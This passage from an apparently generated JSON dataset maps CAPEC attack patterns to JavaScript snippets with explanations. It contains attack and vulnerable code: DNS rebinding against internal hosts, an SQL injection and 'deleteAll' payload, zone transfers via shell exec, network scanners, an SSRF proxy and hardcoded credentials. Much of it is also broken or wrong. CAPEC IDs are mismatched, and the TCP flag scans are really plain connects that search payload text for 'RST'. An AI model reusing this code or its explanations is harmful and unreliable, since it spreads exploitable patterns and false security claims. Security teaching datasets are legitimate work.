        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Check for GET method to access sensitive data\n  if (req.method === 'GET') {\n    // Simulate sensitive data access\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Sensitive Data Accessed');\n  } else {\n    // Deny access for other HTTP methods\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server checks the HTTP method of incoming requests. If the method is 'GET', it responds with 'Sensitive Data Accessed', simulating access to sensitive data. For any other HTTP method, it responds with 'Access Denied'. This code demonstrates the vulnerability described in the CAPEC by relying solely on the HTTP method to control access to sensitive data. An attacker could exploit this by using a different HTTP method to bypass the access control, highlighting CWE-654 (Reliance on a Single Factor in a Security Decision) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const targetHost = 'malicious.example.com';\n  dns.resolve4(targetHost, (err, addresses) => {\n    if (err) throw err;\n    const initialIP = addresses[0];\n    console.log(`Initial IP: ${initialIP}`);\n\n    // Simulate a delay before rebinding\n    setTimeout(() => {\n      dns.resolve4(targetHost, (err, newAddresses) => {\n        if (err) throw err;\n        const reboundIP = newAddresses[0];\n        console.log(`Rebound IP: ${reboundIP}`);\n\n        // Simulate accessing an internal resource\n        http.get(`http://${reboundIP}/internal-resource`, (internalRes) => {\n          let data = '';\n          internalRes.on('data', (chunk) => { data += chunk; });\n          internalRes.on('end', () => {\n            res.writeHead(200, { 'Content-Type': 'text/plain' });\n            res.end(`Internal Data: ${data}`);\n          });\n        });\n      });\n    }, 5000); // 5 seconds delay to simulate DNS rebinding\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a DNS Rebinding attack using Node.js. The server initially resolves the IP address of a malicious domain ('malicious.example.com'). After a delay, it resolves the domain again to get a new IP address, simulating the DNS rebinding process. The new IP address is assumed to be an internal address within the target organization. The server then makes an HTTP request to this internal address to access potentially sensitive internal resources. This code embodies the main idea of DNS Rebinding (CAPEC-148) and incorporates CWE-1327 (Binding to an Unrestricted IP Address) by binding the server to '0.0.0.0', making it accessible from any network interface."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('AUTH username:password');\n});\n\nclient.on('data', (data) => {\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString() === 'AUTH_SUCCESS') {\n        console.log('Authentication successful');\n    } else {\n        console.log('Authentication failed');\n    }\n    client.destroy();\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n    console.error('Connection error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP client that connects to a server and sends authentication information in cleartext. This embodies the main idea of CAPEC-272 (Inter-component Protocol Manipulation) by showcasing vulnerabilities related to improper neutralization, cleartext transmission, and lack of message integrity checks. Specifically, the code sends sensitive information ('username:password') in cleartext (CWE-319) and does not verify the integrity of the received message (CWE-924), making it susceptible to interception and manipulation by an adversary."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\n// Read XML data from a file\nfs.readFile('data.xml', 'utf8', (err, data) => {\n  if (err) throw err;\n\n  // Parse the XML data\n  xml2js.parseString(data, (err, result) => {\n    if (err) throw err;\n\n    // Assume the 'user' field is immutable and trusted\n    const user = result.session.user[0];\n\n    // Incorrectly assume the 'user' field is safe to use directly\n    if (user === 'admin') {\n      console.log('Admin access granted');\n    } else {\n      console.log('Access denied');\n    }\n  });\n});",
        "description": "This JavaScript code snippet reads and parses an XML file using the 'xml2js' library. It then extracts the 'user' field from the parsed XML data and makes an incorrect assumption that this field is immutable and trusted. If the 'user' field is 'admin', it grants admin access. This embodies the main idea of CAPEC-272 (Data Interchange Protocol Manipulation) by demonstrating how an attacker could manipulate the XML data to impersonate an admin. The code also highlights CWE-302 (Authentication Bypass by Assumed-Immutable Data) by assuming the 'user' field is immutable and CWE-707 (Improper Neutralization) by not validating the XML data properly."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Manipulating the request body to include unexpected values\nconst maliciousPayload = JSON.stringify({\n  userId: '1 OR 1=1', // SQL Injection\n  action: 'deleteAll' // Unauthorized action\n});\n\nreq.write(maliciousPayload);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a web service protocol manipulation attack. The code constructs an HTTP POST request to a web service endpoint '/api/data' on 'example.com'. The request body is manipulated to include unexpected values, such as a SQL injection payload ('1 OR 1=1') and an unauthorized action ('deleteAll'). This can cause the web application to react differently than intended, potentially granting unauthorized access or causing data loss. The code embodies the main idea of CAPEC-252 (Web Services Protocol Manipulation) and highlights related weaknesses such as improper neutralization (CWE-707) and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "const soapRequest = `<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n  <soapenv:Header/>\n  <soapenv:Body>\n    <web:Login>\n      <web:username>admin</web:username>\n      <web:password>password</web:password>\n    </web:Login>\n  </soapenv:Body>\n</soapenv:Envelope>`;\n\nfetch('http://example.com/webservice', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'text/xml'\n  },\n  body: soapRequest\n})\n.then(response => response.text())\n.then(data => console.log(data))\n.catch(error => console.error('Error:', error));",
        "description": "This JavaScript code snippet demonstrates a SOAP request to a web service. The SOAP request contains a login operation with a username and password. The code sends the SOAP request to the server using the Fetch API. This example embodies the main idea of SOAP Manipulation (CAPEC-###) by showing how an attacker could manipulate SOAP parameters to interact with the server. The code does not include proper neutralization of input (CWE-707), relies on client-side enforcement of security (CWE-602), and does not restrict XML external entity references (CWE-611). Additionally, it demonstrates the potential for authentication bypass (CWE-294) and the use of client-side authentication (CWE-603)."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/service?wsdl';\nconst args = { param1: 'value1', param2: 'value2' };\n\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  client.MyFunction(args, function(err, result) {\n    if (err) throw err;\n    console.log(result);\n  });\n});\n\n// Vulnerability: SOAP Parameter Tampering\n// An attacker can modify the 'args' object to inject malicious parameters\n// Example: args = { param1: 'malicious_value', param2: 'value2' };\n// This can lead to unauthorized actions or data exposure.",
        "description": "This JavaScript code snippet demonstrates a SOAP client making a request to a web service. The 'args' object contains parameters that are sent to the service. The main idea of the CAPEC is SOAP Parameter Tampering, where an attacker can modify the 'args' object to inject malicious parameters. This can lead to unauthorized actions or data exposure. The related CWEs provide additional context, such as the exposure of sensitive information through WSDL files (CWE-651) and authentication bypass issues (CWE-294). The code highlights the vulnerability by showing how an attacker could tamper with the parameters to exploit the SOAP request."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg.toString() === 'ping') {\n    console.log(`Received ping from ${rinfo.address}`);\n    server.send('pong', rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending pong:', err);\n    });\n  }\n});\n\nserver.bind(41234, () => {\n  console.log('Server listening on port 41234');\n});",
        "description": "This JavaScript code snippet creates a simple UDP server using the 'dgram' module. The server listens for incoming messages on port 41234. When it receives a message with the content 'ping', it logs the sender's address and responds with 'pong'. This simulates the ICMP Echo Request Ping (CAPEC-200) behavior, where a 'ping' request is sent to check if a host is responsive. The code also highlights potential vulnerabilities related to the listed CWEs: \n- CWE-200: The server logs the sender's address, potentially exposing sensitive information.\n- CWE-319: The 'ping' and 'pong' messages are transmitted in cleartext, which can be sniffed by unauthorized actors.\n- CWE-1320: The server does not implement any protection for outbound error messages, which could be exploited to disable alerts.\n- CWE-444: Although not directly related to HTTP, the server could be extended to handle HTTP requests, potentially leading to inconsistent interpretations.\n- CWE-1313: The code does not include any safeguards against runtime activation of debug logic, which could be exploited to alter the server's behavior."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPorts = [22, 80, 443, 8080];\n\nfunction synScan(host, ports) {\n  ports.forEach(port => {\n    const socket = new net.Socket();\n    socket.setTimeout(2000);\n    socket.on('connect', () => {\n      console.log(`Port ${port} is open on ${host}`);\n      socket.destroy();\n    });\n    socket.on('timeout', () => {\n      console.log(`Port ${port} is filtered or closed on ${host}`);\n      socket.destroy();\n    });\n    socket.on('error', (err) => {\n      console.log(`Port ${port} is closed on ${host}`);\n    });\n    socket.connect(port, host);\n  });\n}\n\nsynScan(targetHost, targetPorts);",
        "description": "This JavaScript code snippet performs a basic SYN scan on a target host to determine the status of specified ports. The 'net' module is used to create a socket connection to each port. If the connection is successful, the port is considered open. If the connection times out or an error occurs, the port is considered closed or filtered. This code embodies the main idea of the CAPEC by demonstrating a SYN scan, which is a common method used by adversaries to perform system reconnaissance. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the risk of excessive attack surface (CWE-1125), which can be exploited through such scanning techniques."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('ping');\nconst serverAddress = '192.168.1.1';\nconst serverPort = 12345;\n\nclient.send(message, serverPort, serverAddress, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Ping message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a basic ICMP Echo Request Ping using UDP sockets. The client sends a 'ping' message to a specified server address and port. Upon receiving a response, it logs the message and closes the connection. This code embodies the deprecated CAPEC-285, which involves sending ICMP Echo Requests to check the reachability of a host. The related CWE-294 (Authentication Bypass by Capture-replay) is relevant here as the simplicity of the ping request/response mechanism could be exploited by an attacker to replay messages, potentially bypassing authentication mechanisms if not properly secured."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n  const password = queryObject.password;\n\n  // Authentication Bypass Issue (CWE-287)\n  if (user === 'admin' && password === 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('Welcome, admin!');\n  } else {\n    res.writeHead(401, {'Content-Type': 'text/html'});\n    res.end('Unauthorized');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. It parses the URL query parameters to extract 'user' and 'password'. The code then checks if the user is 'admin' and the password is 'admin', and if so, it grants access by responding with 'Welcome, admin!'. Otherwise, it responds with 'Unauthorized'. This code embodies the deprecated CAPEC concept of 'Infrastructure-based footprinting' by demonstrating a basic authentication mechanism that is vulnerable to authentication bypass issues (CWE-287). The use of hardcoded credentials and lack of proper authentication mechanisms highlight the security weaknesses that can be exploited by attackers."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction enumerateMXRecords(domain) {\n  dns.resolveMx(domain, (err, addresses) => {\n    if (err) {\n      console.error('Error resolving MX records:', err);\n      return;\n    }\n    addresses.forEach(record => {\n      console.log(`MX Record: ${record.exchange} with priority ${record.priority}`);\n      dns.reverse(record.exchange, (err, hostnames) => {\n        if (err) {\n          console.error('Error performing reverse DNS lookup:', err);\n          return;\n        }\n        console.log(`Reverse DNS for ${record.exchange}: ${hostnames}`);\n      });\n    });\n  });\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates how to enumerate MX records for a given domain using Node.js's 'dns' module. The function 'enumerateMXRecords' takes a domain name as input and performs a DNS query to retrieve the MX records. For each MX record, it logs the mail exchange server and its priority. Additionally, it performs a reverse DNS lookup on each mail exchange server to obtain the associated hostnames. This process can reveal sensitive information about the network's mail servers and potentially expose internal IP addresses or firewall details, embodying the main idea of CAPEC-Enumerate Mail Exchange (MX) Records. The code also touches on related CWEs by exposing sensitive information (CWE-200), relying on reverse DNS resolution (CWE-350), and potentially omitting security-relevant information (CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performZoneTransfer(domain) {\n  dns.resolveNs(domain, (err, nameservers) => {\n    if (err) throw err;\n    nameservers.forEach(ns => {\n      const dig = require('child_process').exec;\n      dig(`dig @${ns} ${domain} AXFR`, (error, stdout, stderr) => {\n        if (error) {\n          console.error(`Error: ${stderr}`);\n          return;\n        }\n        console.log(`Zone Transfer Data from ${ns}:\n${stdout}`);\n      });\n    });\n  });\n}\n\nperformZoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS Zone Transfer attack. It uses the 'dns' module to resolve the nameservers for a given domain and then attempts to perform a zone transfer using the 'dig' command. The 'dig' command is executed for each nameserver to retrieve the DNS zone data. This code embodies the main idea of CAPEC-137 (DNS Zone Transfers) by exploiting a DNS misconfiguration that permits zone transfers, potentially exposing sensitive information about the network topology. The related CWEs highlight the risks of exposing sensitive information (CWE-200) and the reliance on DNS for security decisions (CWE-350)."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "const net = require('net');\nconst dns = require('dns');\n\nconst ipRange = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n\nipRange.forEach(ip => {\n  const client = new net.Socket();\n  client.setTimeout(1000);\n  client.connect(80, ip, () => {\n    console.log(`Host ${ip} is alive`);\n    client.destroy();\n  });\n  client.on('error', () => {\n    console.log(`Host ${ip} is not responding`);\n  });\n  client.on('timeout', () => {\n    console.log(`Host ${ip} timed out`);\n    client.destroy();\n  });\n});\n\n// Example of CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndns.reverse('192.168.1.1', (err, hostnames) => {\n  if (err) {\n    console.log('Reverse DNS lookup failed');\n  } else {\n    console.log(`Hostnames for 192.168.1.1: ${hostnames}`);\n  }\n});\n\n// Example of CWE-291: Reliance on IP Address for Authentication\nconst authenticate = (ip) => {\n  const allowedIPs = ['192.168.1.1', '192.168.1.2'];\n  if (allowedIPs.includes(ip)) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n};\nauthenticate('192.168.1.1');",
        "description": "This JavaScript code snippet demonstrates a basic host discovery mechanism by attempting to connect to a range of IP addresses on port 80. If a connection is successful, it indicates that the host is alive. The code also includes examples of related CWEs: CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by performing a reverse DNS lookup, and CWE-291 (Reliance on IP Address for Authentication) by using an IP address for authentication. This code embodies the main idea of CAPEC-309 (Host Discovery) by probing IP addresses to determine if hosts are alive, while also highlighting potential security weaknesses related to DNS resolution and IP-based authentication."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "const net = require('net');\n\nfunction traceroute(target) {\n  let ttl = 1;\n  const maxHops = 30;\n  const port = 33434;\n\n  function sendPacket() {\n    const socket = new net.Socket();\n    socket.setTimeout(5000);\n    socket.on('error', () => {});\n    socket.on('timeout', () => {});\n    socket.connect(port, target, () => {\n      console.log(`Hop ${ttl}: ${socket.remoteAddress}`);\n      socket.destroy();\n      if (ttl < maxHops) {\n        ttl++;\n        sendPacket();\n      }\n    });\n    socket.setTTL(ttl);\n  }\n\n  sendPacket();\n}\n\ntraceroute('example.com');",
        "description": "This JavaScript code snippet demonstrates a basic implementation of a traceroute utility using the 'net' module. The function 'traceroute' sends packets to a target server, incrementing the Time-to-Live (TTL) field with each hop. When the TTL expires, an ICMP diagnostic message is generated, revealing the IP address of the hop. This process continues until the maximum number of hops is reached or the target is reached. The code embodies the main idea of CAPEC-292 (Traceroute Route Enumeration) by mapping out the route data flows through the network. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) are demonstrated by the potential exposure of network topology information. CWE-319 (Cleartext Transmission of Sensitive Information) is implied as the data is transmitted without encryption. CWE-941 (Incorrectly Specified Destination in a Communication Channel) is represented by the need to correctly specify the target destination."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg[0] === 17) { // ICMP Type 17 Address Mask Request\n    const response = Buffer.from([18, ...Array(7).fill(0)]); // ICMP Type 18 Address Mask Reply\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(0, '0.0.0.0'); // CWE-1327: Binding to an Unrestricted IP Address\nconsole.log('Server listening on 0.0.0.0');",
        "description": "This JavaScript code snippet creates a UDP server that listens for ICMP Address Mask Requests (ICMP Type 17) and responds with an Address Mask Reply (ICMP Type 18). The server binds to the unrestricted IP address 0.0.0.0, which is a common vulnerability (CWE-1327). When an ICMP Type 17 message is received, the server sends back a Type 18 message, potentially exposing sensitive network configuration information (CWE-200). This code demonstrates how an adversary could exploit the ICMP Address Mask Request vulnerability to gather information about a target's network, aiding in further attacks."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'GET' && req.url.startsWith('/timestamp')) {\n    const timestamp = new Date().toISOString();\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(`Timestamp: ${timestamp}`);\n  } else {\n    res.writeHead(404, { 'Content-Type': 'text/plain' });\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for GET requests at the '/timestamp' endpoint and responds with the current timestamp in ISO format. This demonstrates the 'Timestamp Request' attack pattern (CAPEC) by exposing the server's current time. An attacker could use this information to exploit time-based security mechanisms. The code also touches on related CWEs: it exposes sensitive information (CWE-200), uses the GET method with sensitive data (CWE-598), and could potentially be used in timing attacks (CWE-208, CWE-385) or replay attacks (CWE-294)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg.toString() === 'ICMP_INFO_REQUEST') {\n    const response = Buffer.from('ICMP_INFO_REPLY');\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(12345, () => {\n  console.log('Server listening on port 12345');\n});",
        "description": "This JavaScript code snippet creates a UDP server that listens for incoming messages. When it receives a message with the content 'ICMP_INFO_REQUEST', it responds with 'ICMP_INFO_REPLY'. This simulates the behavior of an ICMP Information Request and Reply, which is a deprecated mechanism. The code embodies the main idea of the CAPEC by demonstrating how an adversary might send an ICMP Information Request to a host to see if it responds. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497) and the cleartext transmission of data (CWE-319). The code does not implement any security measures, making it vulnerable to unauthorized access and information leakage."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendTcpAckPing(host, port) {\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    const ackPacket = Buffer.from([0x10]); // ACK flag set\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes(Buffer.from([0x14]))) { // RST flag set\n      console.log('Host is alive');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err.message);\n  });\n}\n\nsendTcpAckPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP ACK Ping to determine if a host is alive. It uses the 'net' module to create a TCP connection to a specified host and port. The client sends a TCP segment with the ACK flag set. If the host is alive, it will respond with a RST packet, which the client detects and logs a message indicating the host is alive. This code embodies the main idea of the CAPEC by using a TCP ACK Ping to check for host availability. The related CWEs provide context for potential vulnerabilities, such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319), which could be exploited in a real-world scenario."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetHost = '192.168.1.1';\nconst targetPort = 65535;\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending UDP packet:', err);\n  } else {\n    console.log('UDP packet sent to', targetHost, 'on port', targetPort);\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});",
        "description": "This JavaScript code snippet demonstrates a UDP ping to a high port (65535) on a target host (192.168.1.1). The code uses the 'dgram' module to create a UDP socket and sends an empty UDP datagram to the target. If the target host is alive and the port is closed, it may respond with an 'ICMP port unreachable' message, indicating the host's presence. The code also listens for incoming messages, which could include the ICMP response. This snippet embodies the CAPEC concept of using UDP pings to determine if a host is alive, while also touching on related CWEs such as exposure of sensitive information (CWE-200) and improper protection for outbound error messages (CWE-1320)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendSYNPing(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    console.log('SYN packet sent');\n  });\n\n  client.on('data', (data) => {\n    if (data.toString().includes('SYN/ACK')) {\n      console.log('Port is open');\n    } else if (data.toString().includes('RST')) {\n      console.log('Port is closed');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.log('Error: ' + err.message);\n    client.destroy();\n  });\n}\n\nsendSYNPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that sends a SYN packet to a specified target and port. The function 'sendSYNPing' initiates a connection to the target, simulating the first step of the TCP three-way handshake. If the target port is open, it will respond with a SYN/ACK packet, indicating the port is open. If the port is closed, it will respond with a RST packet. The code listens for these responses and logs whether the port is open or closed. This embodies the main idea of the CAPEC 'TCP SYN Ping' by using TCP SYN packets for host discovery. The code also touches on CWE-200 (Exposure of Sensitive Information) by potentially revealing the status of the port, and CWE-319 (Cleartext Transmission of Sensitive Information) as the communication is not encrypted."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "const net = require('net');\nconst sensitiveData = 'password123'; // CWE-200, CWE-319\n\nconst server = net.createServer((socket) => {\n  socket.write('Echo server\r\n');\n  socket.pipe(socket);\n});\n\nserver.listen(1337, '127.0.0.1'); // CWE-605\n\n// Simulate a port scan\nfor (let port = 1337; port <= 1340; port++) {\n  const client = new net.Socket();\n  client.connect(port, '127.0.0.1', () => {\n    console.log(`Port ${port} is open`);\n    client.write(sensitiveData); // CWE-319\n  });\n  client.on('error', (err) => {\n    console.log(`Port ${port} is closed`);\n  });\n}\n\n// SSRF vulnerability example\nconst http = require('http');\nhttp.createServer((req, res) => {\n  const targetUrl = req.url.substring(1); // CWE-918\n  http.get(targetUrl, (response) => {\n    response.pipe(res);\n  });\n}).listen(8080, '127.0.0.1');",
        "description": "This JavaScript code snippet demonstrates a simple TCP server and a port scanning simulation, embodying the main idea of CAPEC-300 (Port Scanning). The server listens on port 1337, and a loop attempts to connect to ports 1337 to 1340, logging whether each port is open or closed. Sensitive data is transmitted in cleartext (CWE-200, CWE-319), and multiple binds to the same port are allowed (CWE-605). Additionally, an SSRF vulnerability is demonstrated by creating an HTTP server that fetches content from a URL specified in the request without validation (CWE-918). This code highlights the risks associated with port scanning and related weaknesses."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to ' + targetIP + ':' + targetPort);\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.log('Port ' + targetPort + ' is closed or unreachable.');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP connect scan to check if a specific port on a target IP address is open. The code attempts to establish a TCP connection to the target IP and port. If the connection is successful, it logs a message indicating the port is open and then closes the connection. If an error occurs, it logs that the port is closed or unreachable. This embodies the main idea of the CAPEC 'TCP Connect Scan' by using a full TCP connection attempt to determine the status of a port. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) if the target system logs connection attempts, and it relies on IP address for identifying the target (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpFinScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const finPacket = Buffer.from([0x01]); // Simplified FIN packet\n    client.write(finPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.log(`Port ${port} is open on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\ntcpFinScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP FIN scan to determine if a port is closed on a target machine. The code uses the 'net' module to create a TCP client that connects to a specified port on the target. It then sends a simplified FIN packet to the target. If the target responds with an RST packet, it indicates that the port is closed. Otherwise, the port is considered open. This scan technique leverages the behavior described in RFC 793, where out-of-state TCP segments sent to closed ports elicit RST responses. The code also includes basic error handling. This example embodies the CAPEC's main idea of using TCP FIN scans to detect closed ports and highlights potential weaknesses such as exposure of sensitive information (CWE-200) and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "const net = require('net');\n\nfunction sendXmasScan(target, port) {\n  const client = new net.Socket();\n  const xmasPacket = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]); // All flags set\n\n  client.connect(port, target, () => {\n    client.write(xmasPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\nsendXmasScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Xmas scan using Node.js. The function `sendXmasScan` takes a target IP address and a port number as arguments. It creates a TCP socket and sends a packet with all TCP flags set (Xmas packet) to the specified port on the target machine. If the target responds with a TCP RST packet, it indicates that the port is closed. The code also handles errors and logs the results. This scan technique is used to identify closed ports on a target machine, which can be useful for an attacker to map the network and identify potential vulnerabilities. The code embodies the main idea of the CAPEC by demonstrating how an attacker might use a TCP Xmas scan to gather information about closed ports, potentially exposing sensitive information (CWE-200) and exploiting weaknesses in communication protocols (CWE-923, CWE-924)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpNullScan(target, port) {\n  const client = new net.Socket();\n\n  client.connect(port, target, () => {\n    const nullPacket = Buffer.alloc(0); // Create an empty buffer to simulate a TCP NULL packet\n    client.write(nullPacket);\n  });\n\n  client.on('data', (data) => {\n    console.log(`Received data: ${data.toString()}`);\n  });\n\n  client.on('error', (err) => {\n    if (err.code === 'ECONNRESET') {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.error(`Error: ${err.message}`);\n    }\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\ntcpNullScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP NULL scan, which is used to determine if ports are closed on a target machine. The code uses the 'net' module to create a TCP connection to a specified target and port. It then sends an empty buffer to simulate a TCP NULL packet. If the port is closed, the target machine will respond with a TCP RST packet, causing an 'ECONNRESET' error, which is caught and logged to indicate that the port is closed. This code embodies the main idea of CAPEC-200, CAPEC-353, and CAPEC-319 by exposing sensitive information (port status) through a cleartext transmission and lacking integrity checks. Additionally, it demonstrates CWE-476 by potentially dereferencing a NULL pointer if the connection fails."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
